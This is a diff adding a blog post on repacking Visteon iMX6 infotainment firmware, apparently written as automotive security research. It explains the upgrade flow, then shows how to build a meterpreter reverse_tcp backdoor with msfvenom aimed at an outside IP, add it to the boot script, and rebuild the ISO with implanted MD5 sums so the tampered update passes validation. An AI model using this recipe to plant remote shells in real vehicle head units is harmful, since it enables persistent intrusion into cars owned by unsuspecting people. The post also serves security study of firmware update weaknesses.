@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Preface
+The firmware layout is shown below. It is split into three directories: APP, SOC, and MCU—roughly corresponding to the application layer, the core board, and the base board. APP is used to update navigation maps and voice-recognition library data. The MCU directory is used to update MCU firmware, including the base board and the instrument cluster. The SOC directory is used to upgrade the core-board system. version.txt is used for version validation. By reversing the upgrade program, I found there was no additional signature verification; however, a tampered ISO would still fail to upgrade—hence this write-up."><title>Visteon Firmware Repacking&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Visteon Firmware Repacking" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">Visteon Firmware Repacking</h1><p class="article date">Friday, November 30, 2018<span class="langs"><span class="lang">
+                    <a href="/zh/posts/visteon-firmware-repacking/" title="中文">
+                        <span class="lang-icon">🌐</span>中文</a>
+                </span></span></p></section><article class="article markdown-body"><h2 id="preface">Preface</h2>
+<p>The firmware layout is shown below. It is split into three directories: <code>APP</code>, <code>SOC</code>, and <code>MCU</code>—roughly corresponding to the application layer, the core board, and the base board. <code>APP</code> is used to update navigation maps and voice-recognition library data. The <code>MCU</code> directory is used to update MCU firmware, including the base board and the instrument cluster. The <code>SOC</code> directory is used to upgrade the core-board system. <code>version.txt</code> is used for version validation. By reversing the upgrade program, I found there was no additional signature verification; however, a tampered ISO would still fail to upgrade—hence this write-up.</p>
+<p><img loading="lazy"  src="file_tree.png"
+        alt="file_tree"/></p>
+<h2 id="upgrade-process">Upgrade Process</h2>
+<p>On Visteon’s iMX6 platform, there is a “recovery partition” dedicated to system upgrades.</p>
+<p>First, modify the boot setting to access the device node directly, so that U‑Boot boots from partition 2 on the next boot.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">2</span> &gt; /sys/devices/soc0/soc.0/2100000.aips-bus/2198000.usdhc/mmc_host/mmc2/mmc2:0001/boot_config
+</span></span></code></pre></div><p>After booting, it formats and mounts the original system partition.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfs.ext3 -F /dev/mmcblk2p2
+</span></span><span class="line"><span class="cl">mount -t ext3 -o rw /dev/mmcblk2p2 /tmp/mmcblk2p12
+</span></span></code></pre></div><p>Then mount the ISO image:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/mount -t iso9660 -o exec,loop /tmp/mnt/8644_8005_3BFD62ABB2EC3783_0/upgrade-ring.iso /tmp/isofs
+</span></span></code></pre></div><p>Extract <code>rootfs</code> to the target partition:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar xvf /tmp/isofs/rootfs.tar -C /tmp/mmcblk2p12
+</span></span></code></pre></div><h2 id="repacking-rootfs">Repacking <code>rootfs</code></h2>
+<p>Generate an ARMLE backdoor payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p linux/armle/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>206.189.68.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">54444</span> -f elf -o linux_armle.elf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: armle from the payload
+</span></span><span class="line"><span class="cl">No encoder or badchars specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">260</span> bytes
+</span></span><span class="line"><span class="cl">Final size of elf file: <span class="m">344</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: linux_armle.elf
+</span></span></code></pre></div><p>Add it to run at boot:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/linux_armle.elf &amp;&#34;</span> &gt;&gt; ./etc/init.d/rcS
+</span></span></code></pre></div><p>Note: you must not preserve permissions here, otherwise the system may fail to boot.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -cf ../rootfs.tar ./*
+</span></span></code></pre></div><h2 id="iso-9660">ISO-9660</h2>
+<p>ISO-9660 is the CD‑ROM standard that defines the file structure of a CD‑ROM. Joliet is an extension to ISO‑9660. There are currently three levels: Level 1 is DOS-compatible; Level 2 supports long filenames but does not support a single file larger than 2 GB; Level 3 supports single-file sizes up to 8 TB.</p>
+<h2 id="udf">UDF</h2>
+<p>UDF (Universal Disk Format) uses packet writing (PW). It can treat CD‑R like a hard drive and supports files larger than 2 GB, but its compatibility is not as good as ISO‑9660.</p>
+<h2 id="iso-md5">ISO MD5</h2>
+<p><img loading="lazy"  src="iso_hex.png"
+        alt="iso_hex"/></p>
+<p>To prevent media corruption, there is MD5 data in the header of the ISO file. However, repacking with UltraISO will not generate this data.
+First, check the ISO metadata—you can see it uses ISO 9660 Joliet Level 3.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ isoinfo -d -i upgrade-ring.raw.iso
+</span></span><span class="line"><span class="cl">CD-ROM is in ISO <span class="m">9660</span> format
+</span></span><span class="line"><span class="cl">System id: LINUX
+</span></span><span class="line"><span class="cl">Volume id: CDROM
+</span></span><span class="line"><span class="cl">Volume <span class="nb">set</span> id:
+</span></span><span class="line"><span class="cl">Publisher id:
+</span></span><span class="line"><span class="cl">Data preparer id:
+</span></span><span class="line"><span class="cl">Application id: GENISOIMAGE ISO 9660/HFS FILESYSTEM CREATOR <span class="o">(</span>C<span class="o">)</span> <span class="m">1993</span> E.YOUNGDALE <span class="o">(</span>C<span class="o">)</span> 1997-2006 J.PEARSON/J.SCHILLING <span class="o">(</span>C<span class="o">)</span> 2006-2007 CDRKIT TEAM
+</span></span><span class="line"><span class="cl">Copyright File id:
+</span></span><span class="line"><span class="cl">Abstract File id:
+</span></span><span class="line"><span class="cl">Bibliographic File id:
+</span></span><span class="line"><span class="cl">Volume <span class="nb">set</span> size is: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Volume <span class="nb">set</span> sequence number is: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Logical block size is: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">Volume size is: <span class="m">488066</span>
+</span></span><span class="line"><span class="cl">Joliet with UCS level <span class="m">3</span> found
+</span></span><span class="line"><span class="cl">Rock Ridge signatures version <span class="m">1</span> found
+</span></span></code></pre></div><p>First, use <code>mkisofs</code> to pack the ISO directory:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkisofs -h
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">-J, -joliet 生成Joliet目录信息
+</span></span><span class="line"><span class="cl">-T, -translation-table 支持长文件名
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkisofs -J -T -v -o upgrade-ring.iso iso/
+</span></span></code></pre></div><p>After the ISO is built, use <code>implantisomd5</code> to embed the MD5.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ implantisomd5 upgrade-ring.iso
+</span></span><span class="line"><span class="cl">Inserting md5sum into iso image...
+</span></span><span class="line"><span class="cl"><span class="nv">md5</span> <span class="o">=</span> e1914b1bf902a63244e3bb810823e6b2
+</span></span><span class="line"><span class="cl">Inserting fragment md5sums into iso image...
+</span></span><span class="line"><span class="cl"><span class="nv">fragmd5</span> <span class="o">=</span> 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8
+</span></span><span class="line"><span class="cl"><span class="nv">frags</span> <span class="o">=</span> <span class="m">20</span>
+</span></span><span class="line"><span class="cl">Setting supported flag to <span class="m">0</span>
+</span></span></code></pre></div><p>Finally, validate it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checkisomd5 upgrade-ring.iso
+</span></span><span class="line"><span class="cl">upgrade-ring.raw.iso:   e1914b1bf902a63244e3bb810823e6b2
+</span></span><span class="line"><span class="cl">Fragment sums: 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8
+</span></span><span class="line"><span class="cl">Fragment count: <span class="m">20</span>
+</span></span><span class="line"><span class="cl">Supported ISO: no
+</span></span><span class="line"><span class="cl">Press <span class="o">[</span>Esc<span class="o">]</span> to abort check.
+</span></span><span class="line"><span class="cl">Checking: 100.0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The media check is complete, the result is: PASS.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">It is OK to use this media.
+</span></span></code></pre></div></article><section class="article labels"><a class="category" href=/en/categories/automotive-security/>Automotive Security</a><a class="tag" href=/en/tags/visteon/>Visteon</a><a class="tag" href=/en/tags/imx6/>iMX6</a><a class="tag" href=/en/tags/iso/>ISO</a></section>
+</div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/firmware-extraction-series-rawnand-file-recovery/"><span class="iconfont icon-article"></span>Firmware Extraction Series - Raw NAND File Recovery</a></p><p><a class="link" href="/en/posts/tinyscheme-file-io/"><span class="iconfont icon-article"></span>TinyScheme File I/O</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
+        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
+            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
+            CC BY-NC-SA 4.0
+        </a>
+        (Attribution-NonCommercial-ShareAlike).
+    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>
+
+</html>
